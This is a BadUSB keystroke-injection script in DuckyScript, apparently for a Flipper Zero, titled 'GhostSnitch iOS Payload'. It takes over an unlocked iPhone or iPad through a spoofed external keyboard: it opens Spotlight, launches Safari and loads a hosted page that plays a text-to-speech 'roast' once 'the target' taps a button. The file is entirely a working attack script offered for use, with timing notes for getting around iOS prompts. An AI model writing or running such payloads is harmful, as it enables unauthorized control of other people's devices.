REM GhostSnitch iOS Payload
REM Author: TBJr
REM Version: 1.1
REM Description: Opens Safari and navigates to the hosted GhostSnitch page
REM
REM REQUIREMENTS:
REM   - Device must be unlocked and on the home screen
REM   - Works on any iOS/iPadOS device with Safari (no jailbreak needed)
REM   - The hosted page shows a "Tap to Continue" button — the target must
REM     tap it once so the Web Speech API autoplay policy is satisfied
REM     and the TTS roast actually fires
REM
REM LIMITATIONS:
REM   - Spotlight search (CMD+Space) requires an external keyboard to be
REM     trusted by the device; iOS prompts "Trust this accessory?" on first use
REM   - On iPhone the first ENTER in Spotlight may open a web search rather
REM     than the Safari app; a longer DELAY or second ENTER attempt may help
REM   - CMD+L focuses Safari's address bar on iPadOS 16+ and iOS 16+;
REM     older versions may need a tap on the address bar instead

REM ── Step 1: Open Spotlight ───────────────────────────────────────────────────
REM CMD+Space opens Spotlight on both iPhone and iPad with an external keyboard
GUI SPACE
DELAY 1200

REM ── Step 2: Search for Safari and open it ────────────────────────────────────
STRING safari
DELAY 900
ENTER
DELAY 3500

REM ── Step 3: Focus Safari's address bar ───────────────────────────────────────
REM Without CMD+L the URL is typed into the page body (or nowhere), not the omnibox.
REM CMD+L is the standard keyboard shortcut to focus the address bar in Safari
REM on both macOS and iPadOS/iOS with external keyboard (iOS 16+).
GUI l
DELAY 600

REM ── Step 4: Type the URL and navigate ────────────────────────────────────────
STRING https://tbjr.github.io/Flipper-payloads/host/ghostsnitch_ios.html
DELAY 400
ENTER

REM ── Done ─────────────────────────────────────────────────────────────────────
REM Safari loads the GhostSnitch page. The target sees a "Tap to Continue"
REM prompt and must tap it — this is intentional and required by Apple's
REM autoplay policy; there is no way to bypass it from a web page.
